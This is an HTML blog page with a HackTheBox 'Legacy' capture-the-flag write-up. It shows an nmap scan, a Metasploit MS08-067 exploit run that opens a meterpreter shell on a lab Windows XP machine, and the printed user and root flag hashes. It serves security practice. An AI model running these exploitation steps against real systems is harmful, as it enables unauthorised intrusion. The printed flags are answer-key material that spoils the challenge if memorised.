@@ -1,0 +1,853 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
+  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+
+<html lang="en-US" class="no-js">
+  <head>
+    <meta charset="utf-8">
+<!-- begin _includes/seo.html --><title>HackTheBox Legacy - Dcodezero</title>
+<meta name="description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
+
+
+  <meta name="author" content="Dcodezero">
+  
+  <meta property="article:author" content="Dcodezero">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Dcodezero">
+<meta property="og:title" content="HackTheBox Legacy">
+<meta property="og:url" content="https://dcodezero.github.io//https://dcodezero.github.io/hackthebox/Legacy/">
+
+
+  <meta property="og:description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
+
+
+
+  <meta property="og:image" content="https://dcodezero.github.io//https://dcodezero.github.io/assets/img/sample/legacy.png">
+
+
+
+  <meta name="twitter:site" content="@Dcodezero">
+  <meta name="twitter:title" content="HackTheBox Legacy">
+  <meta name="twitter:description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
+  <meta name="twitter:url" content="https://dcodezero.github.io//https://dcodezero.github.io/hackthebox/Legacy/">
+
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://dcodezero.github.io//https://dcodezero.github.io/assets/img/sample/legacy.png">
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2020-03-09T00:00:00+00:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://dcodezero.github.io//https://dcodezero.github.io/hackthebox/Legacy/">
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/https://dcodezero.github.io/feed.xml" type="application/atom+xml" rel="alternate" title="Dcodezero Feed">
+
+
+<!-- Add Mermaid with Debug -->
+<script src="https://cdn.jsdelivr.net/npm/mermaid@8.14.0/dist/mermaid.min.js"></script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    mermaid.initialize({
+        startOnLoad: true,
+        securityLevel: 'loose',
+        logLevel: 'debug',
+        mindmap: {
+            padding: 20,
+            nodeSpacing: 60,
+            rankSpacing: 80
+        }
+    });
+
+    // Add error handling
+    mermaid.parseError = function(err, hash) {
+        console.error('Mermaid error:', err);
+        // Add visible error message
+        document.querySelectorAll('.mermaid').forEach(function(elem) {
+            elem.innerHTML += '<div style="color: red; background: #ffebee; padding: 10px; margin-top: 10px; border: 1px solid #ffcdd2;">Diagram Error: ' + err + '</div>';
+        });
+    };
+});
+</script><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script>
+document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+ 
+</script>
+<!-- For all browsers -->
+<link rel="stylesheet" href="/https://dcodezero.github.io/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>
+
+    <script id="mcjs">!function(c,h,i,m,p){m=c.createElement(h),p=c.getElementsByTagName(h)[0],m.async=1,m.src=i,p.parentNode.insertBefore(m,p)}(document,"script","https://chimpstatic.com/mcjs-connected/js/users/a236ffe3231543dfa1a53e2a4/b8e03e16b2df243b196811790.js");</script>
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single" dir="ltr">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/https://dcodezero.github.io/">
+          Dcodezero
+          <span class="site-subtitle">Dcodezero</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/about/"
+                
+                
+              >About</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/categories/"
+                
+                
+              >Categories</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/tags"
+                
+                
+              >Tags</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/it-posts/"
+                
+                
+              >I.T</a>
+            </li><li class="masthead__menu-item">
+              <a
+                href="/https://dcodezero.github.io/tools/"
+                
+                
+              >Tools</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style="background-color: #000; background-image: linear-gradient(rgba(0, 0, 0, 0.75), rgba(0, 0, 0, 0.75)), url('/https://dcodezero.github.io/assets/img/sample/legacy.png');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          HackTheBox Legacy
+
+        
+      </h1>
+      
+        <p class="page__lead">Legacy is a retired Windows machine that is rated as Easy on Hack the Box.
+</p>
+      
+      
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          1 minute read
+        
+      </span>
+    
+  </p>
+
+
+      
+        <p>
+        
+          <a href="/https://dcodezero.github.io/hackthebox/Legacy/" class="btn btn--light-outline btn--large">Part 2</a>
+        
+        </p>
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/https://dcodezero.github.io/" itemprop="url">Dcodezero</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>I am an <strong>amazing</strong> person.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">Somewhere</span>
+        </li>
+      
+
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HackTheBox Legacy">
+    <meta itemprop="description" content="Legacy is a retired Windows machine that is rated as Easy on Hack the Box.">
+    <meta itemprop="datePublished" content="2020-03-09T00:00:00+00:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu"><li><a href="#lets-get-started">Let’s get started</a><ul><li><a href="#as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</a></li></ul></li><li><a href="#metasploit">metasploit</a></li><li><a href="#getting-usertxt">Getting User.txt</a></li><li><a href="#getting-roottxt">Getting Root.txt</a><ul><li><a href="#gaining-both-the-flags-is-just-so-easy">Gaining both the flags is just so easy.</a></li></ul></li></ul></li></ul>
+            </nav>
+          </aside>
+        
+        <h2 id="lets-get-started">Let’s get started</h2>
+
+<h3 id="as-always-hacking-starts-with-nmap-scan">As always hacking starts with NMAP scan.</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Nmap scan report for 10.10.10.4
+PORT     STATE  SERVICE       VERSION
+139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open   microsoft-ds  Windows XP microsoft-ds
+3389/tcp closed ms-wbt-server
+Running (JUST GUESSING): Microsoft Windows 2000|XP|2003|PocketPC/CE (91%)
+OS CPE: cpe:/o:microsoft:windows_2000 cpe:/o:microsoft:windows_xp 
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+|_nbstat: NetBIOS name: LEGACY, NetBIOS user: unknown, NetBIOS MAC: 00:50:56:aa:ea:dc (VMware)
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: legacy
+|   NetBIOS computer name: LEGACY\x00
+|   Workgroup: HTB\x00
+| smb-security-mode: 
+|   account_used: blank
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+</code></pre></div></div>
+
+<p>As we can see that it’s a windows [XP] machine, It can be exploited in many ways.
+The easy way is to use metasploit and take down the machine.</p>
+
+<h2 id="metasploit">metasploit</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+msf5 &gt; search netapi
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank    Check  Description
+   -  ----                                 ---------------  ----    -----  -----------
+   0  exploit/windows/smb/ms03_049_netapi  2003-11-11       good    No     MS03-049 Microsoft Workstation Service NetAddAlternateComputerName Overflow
+   1  exploit/windows/smb/ms06_040_netapi  2006-08-08       good    No     MS06-040 Microsoft Server Service NetpwPathCanonicalize Overflow
+   2  exploit/windows/smb/ms06_070_wkssvc  2006-11-14       manual  No     MS06-070 Microsoft Workstation Service NetpManageIPCConnect Overflow
+   3  exploit/windows/smb/ms08_067_netapi  2008-10-28       great   Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+</code></pre></div></div>
+
+<p><br />
+<br /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    msf5 &gt; use exploit/windows/smb/ms08_067_netapi
+    msf5 exploit(windows/smb/ms08_067_netapi) &gt; set rhost 10.10.10.4
+    rhost =&gt; 10.10.10.4
+    msf5 exploit(windows/smb/ms08_067_netapi) &gt; set lhost tun0
+    lhost =&gt; tun0
+    msf5 exploit(windows/smb/ms08_067_netapi) &gt; exploit
+</code></pre></div></div>
+
+<p>After the exploit is successfully completed we get the meterpreter shell…</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; sysinfo
+    Computer        : LEGACY
+    OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+    Architecture    : x86
+    System Language : en_US
+    Domain          : HTB
+    Logged On Users : 1
+    Meterpreter     : x86/windows
+</code></pre></div></div>
+
+<h2 id="getting-usertxt">Getting User.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; ls
+    Listing: C:\Documents and Settings\john\Desktop
+    ===============================================
+    Mode              Size  Type  Last modified              Name
+    ----              ----  ----  -------------              ----
+    100444/r--r--r--  32    fil   2017-03-16 02:19:32 -0400  user.txt
+    meterpreter &gt; cat user.txt
+    e69af0e4f443de7e36876fda4ec7644f
+</code></pre></div></div>
+
+<h2 id="getting-roottxt">Getting Root.txt</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    meterpreter &gt; ls
+    Listing: C:\Documents and Settings\Administrator\Desktop
+    ========================================================
+    Mode              Size  Type  Last modified              Name
+    ----              ----  ----  -------------              ----
+    100444/r--r--r--  32    fil   2017-03-16 02:18:19 -0400  root.txt
+    meterpreter &gt; cat root.txt
+    993442d258b0e0ec917cae9e695d5713
+</code></pre></div></div>
+
+<h4 id="gaining-both-the-flags-is-just-so-easy">Gaining both the flags is just so easy.</h4>
+
+<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>
+
+<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/https://dcodezero.github.io/tags/#metasploit" class="page__taxonomy-item p-category" rel="tag">metasploit</a><span class="sep">, </span>
+    
+      <a href="/https://dcodezero.github.io/tags/#windows" class="page__taxonomy-item p-category" rel="tag">Windows,</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/https://dcodezero.github.io/categories/#hackthebox" class="page__taxonomy-item p-category" rel="tag">hackthebox</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time class="dt-published" datetime="2020-03-09T00:00:00+00:00">March 9, 2020</time></p>
+
+      </footer>
+
+      <section class="page__share">
+  <h4 class="page__share-title">Share on</h4>
+
+  <a href="https://twitter.com/intent/tweet?via=Dcodezero&text=HackTheBox+Legacy%20%2Fhttps%3A%2F%2Fdcodezero.github.io%2Fhackthebox%2FLegacy%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdcodezero.github.io%2F%2Fhttps%3A%2F%2Fdcodezero.github.io%2Fhackthebox%2FLegacy%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://dcodezero.github.io//https://dcodezero.github.io/hackthebox/Legacy/" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/https://dcodezero.github.io/vulnhub/Evm/" class="pagination--pager" title="Vulnhub EVM">Previous</a>
+    
+    
+      <a href="/https://dcodezero.github.io/hackthebox/Bashed/" class="pagination--pager" title="HackTheBox Bashed">Next</a>
+    
+  </nav>
+
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    
+<div class="page__related">
+  
+  <h2 class="page__related-title">You may also enjoy</h2>
+  <div class="grid__wrapper">
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/ai-red-team-practical.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/ai-security/practical-ai-red-teaming-techniques/" rel="permalink">Practical AI Red Teaming: Hands-On Attack Techniques and Tooling
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          18 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">This is where abstract vulnerabilities become concrete exploits.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/tools-scripts.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/tools/red-team/ad-enumeration-toolkit/" rel="permalink">AD Enumeration Toolkit: Scripts I Actually Use
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/tools-scripts.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/tools/red-team/recon-automation-scripts/" rel="permalink">External Recon Automation: Scripts That Save Hours
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          6 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.
+</p>
+  </article>
+</div>
+
+    
+      
+      
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/https://dcodezero.github.io/assets/images/tools-scripts.svg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/https://dcodezero.github.io/tools/red-team/post-exploitation-scripts/" rel="permalink">Post-Exploitation Scripts: Persistence, Pivoting &amp; Data Collection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">Scripts for maintaining access - credential harvesting, persistence mechanisms, lateral movement, and data exfiltration techniques.
+</p>
+  </article>
+</div>
+
+    
+  </div>
+</div>
+
+  
+  
+</div>
+
+      
+    </div>
+
+    
+ 
+  
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+           <!-- Add this CSS to your custom stylesheet (_sass or assets/css/main.scss) -->
+   <style>
+    .subscribe-button {
+      display: inline-block;
+      padding: 12px 24px;
+      background: transparent;
+      border: 2px solid #39ff14;
+      color: #39ff14;
+      text-decoration: none;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: bold;
+      border-radius: 4px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      position: relative;
+      overflow: hidden;
+      transition: all 0.3s ease;
+    }
+    
+    .subscribe-button:hover {
+      background: #39ff14;
+      color: #000;
+      box-shadow: 0 0 15px rgba(57, 255, 20, 0.5);
+    }
+    
+    .subscribe-button::before {
+      content: '>';
+      margin-right: 8px;
+      display: inline-block;
+    }
+    
+    /* Optional: Add animation */
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0.4); }
+      70% { box-shadow: 0 0 0 10px rgba(57, 255, 20, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(57, 255, 20, 0); }
+    }
+    
+    .subscribe-button {
+      animation: pulse 2s infinite;
+    }
+    </style>
+    
+    <!-- Add this HTML where you want the button to appear -->
+    <div style="text-align: center; margin: 30px 0;">
+      <a href="/helpedyou/" class="subscribe-button">Join The Network</a>
+    </div>
+
+<div class="page__footer-follow">
+  <ul class="social-icons">
+    
+      <li><strong>Follow:</strong></li>
+    
+
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+
+    
+      <li><a href="/https://dcodezero.github.io/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+    
+  </ul>
+</div>
+
+
+<div class="page__footer-copyright">&copy; 2026 <a href="https://dcodezero.github.io/">Dcodezero</a>. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/jekyll-themes/minimal-mistakes/" rel="nofollow">Minimal Mistakes</a>.</div> 
+
+      </footer>
+    </div>
+
+    
+  <script src="/https://dcodezero.github.io/assets/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+</html>
